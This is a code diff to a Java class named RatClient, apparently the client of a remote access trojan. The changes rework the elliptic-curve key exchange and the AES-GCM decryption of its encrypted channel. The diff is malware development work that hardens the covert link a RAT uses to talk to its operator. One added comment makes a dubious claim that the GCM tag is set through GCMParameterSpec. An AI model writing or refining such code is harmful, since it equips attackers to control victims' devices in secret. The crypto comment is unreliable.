@@ -53,12 +53,18 @@ public class RatClient {
         } catch (Exception e) { this.uid = "unknown_dev"; }
     }
 
+    // FIXED: Robust EC point extraction via ECPoint API instead of fragile SPKI slicing
     private byte[] performKeyExchange(DataInputStream dis, DataOutputStream dos) throws Exception {
         KeyPairGenerator kpg = KeyPairGenerator.getInstance("EC");
         kpg.initialize(256);
         KeyPair kp = kpg.generateKeyPair();
-        byte[] spki = kp.getPublic().getEncoded();
-        byte[] rawPoint = Arrays.copyOfRange(spki, spki.length - 65, spki.length);
+        java.security.interfaces.ECPublicKey ecPub = (java.security.interfaces.ECPublicKey) kp.getPublic();
+        byte[] rawPoint = new byte[65];
+        rawPoint[0] = 0x04;
+        byte[] x = ecPub.getW().getAffineX().toByteArray();
+        byte[] y = ecPub.getW().getAffineY().toByteArray();
+        System.arraycopy(x, Math.max(0, x.length - 32), rawPoint, 1 + Math.max(0, 32 - x.length), Math.min(32, x.length));
+        System.arraycopy(y, Math.max(0, y.length - 32), rawPoint, 33 + Math.max(0, 32 - y.length), Math.min(32, y.length));
         dos.writeInt(rawPoint.length);
         dos.write(rawPoint);
         dos.flush();
@@ -86,6 +92,7 @@ public class RatClient {
         return ByteBuffer.allocate(12 + 16 + ct.length).put(iv).put(tag).put(ct).array();
     }
 
+    // FIXED: cipher.doFinal(ct) not cipher.doFinal(tag). GCM tag already set via GCMParameterSpec.
     private byte[] aesDecrypt(byte[] data) throws Exception {
         if (data.length < 28) throw new Exception("short frame");
         byte[] iv = Arrays.copyOfRange(data, 0, 12);
